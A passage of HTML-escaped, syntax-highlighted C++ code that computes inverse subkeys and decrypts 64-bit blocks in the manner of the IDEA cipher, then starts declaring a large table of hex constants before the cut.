class=\"token function\">inv_subkeys_get</span><span class=\"token punctuation\">(</span>code sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">48</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">50</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">49</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">51</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">46</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">47</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">49</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">51</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">49</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invPlus</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">51</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">invTimes</span><span class=\"token punctuation\">(</span>sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nbitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> <span class=\"token function\">dencrypt</span><span class=\"token punctuation\">(</span>bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> cipher<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> I_1<span class=\"token punctuation\">,</span> I_2<span class=\"token punctuation\">,</span> I_3<span class=\"token punctuation\">,</span> I_4<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        I_1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">[</span><span class=\"token number\">63</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        I_2<span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">[</span><span class=\"token number\">47</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        I_3<span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">[</span><span class=\"token number\">31</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        I_4<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_1 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> I_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_2 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> I_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_3 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> I_3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_4 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> I_4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_5 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_1<span class=\"token punctuation\">,</span> tmp_3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_6 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_2<span class=\"token punctuation\">,</span> tmp_4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_7 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> tmp_5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_8 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>tmp_6<span class=\"token punctuation\">,</span> tmp_7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_9 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>tmp_8<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_10 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>tmp_7<span class=\"token punctuation\">,</span> tmp_9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        I_1 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_1<span class=\"token punctuation\">,</span> tmp_9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        I_2 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_3<span class=\"token punctuation\">,</span> tmp_9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        I_3 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_2<span class=\"token punctuation\">,</span> tmp_10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        I_4 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_4<span class=\"token punctuation\">,</span> tmp_10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> Y_1 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>I_1<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> Y_2 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>I_3<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">49</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> Y_3 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>I_2<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> Y_4 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>I_4<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">51</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> plaint<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        plaint<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Y_4<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        plaint<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Y_3<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        plaint<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Y_2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        plaint<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">48</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Y_1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> plaint<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> box1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0BA6CAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A05DF1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9ABFB3B7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB40BBE36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74B1D29A</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xEE0E612D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2EB40D81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3667A2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73DC1683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE963A534</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29D9C998</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x076DC419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7D7A8B5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x5D681B02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9DD277AE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBDBDF21D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D079EB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7B82D06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x270241AA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09B64C2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC90C2087</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x53B39330</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9309FF9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0EDB8832</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE61E49E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54DE5729</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94643B85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBAD03604</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A6A5AA8</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xE0D5E91F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x206F85B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA00AE279</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60B08ED5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA0F3D62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3AB551CE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14015C4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD4BB30E3</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x4E048354</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8EBEEFF8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x136C9856</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3D6F4FA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4969474D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x89D32BE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7672660</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67DD4ACC</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xFD62F97B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3DD895D7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1DB71064</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD0D7CC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47B2CF7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8708A3D3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9BCAE52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6906C2FE</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xF3B97149</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33031DE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAED16A4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E6B06E7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4D4B550</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x346ED9FC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1ADAD47D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA60B8D1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x40DF0B66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x806567CA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B64C2B1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5BDEAE1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1611DAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01DB7106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F6F7C87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEFD5102B</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x756AA39C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5D0CF30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2802B89E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8B8D432</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72076785</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2BD0B29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C0906A8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5CB36A04</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xC60CD9B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06B6B51F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26D930AC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6635C00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7CDCEFB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC66831B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92D28E9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5268E236</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xC8D75181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x086D3D2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95BF4A83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5505262F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCFBA9598</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F00F934</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21B4F4B5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE10E9819</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x7BB12BAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB0B4702</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B6E20C8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFBD44C64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x616BFFD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1D1937F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F659EFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4FDFF252</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xD56041E5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15DA2D49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88085AE7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48B2364B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD20D85FC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12B7E950</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C03E4D1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFCB9887D</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x66063BCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6BC5766</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86D3D2D5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4669BE79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDCD60DCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C6C6162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32D86CE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF262004F</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x68DDB3F8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA867DF54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35B5A8FA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF50FC456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6FB077E1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF0A1B4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81BE16CC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41047A60</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xDBBBC9D7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B01A57B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEDB88321</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D02EF8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7BD5C3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77073096</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59B33D17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x990951BB</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x03B6E20C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC30C8EA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5EDEF90E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E6495A2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04DB2615</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4614AB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEAD54738</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A6F2B94</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xB0D09823</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x706AF48F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5005713C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90BF1D90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A00AE27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCABAC28B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE40ECF0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24B4A3A6</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xBE0B1011</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7EB17CBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3630B13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23D967BF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB966D408</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79DCB8A4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5768B525</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97D2D989</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x0D6D6A3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCDD70692</span><span class=\"token punctuation\">,</span> <span class=\"token 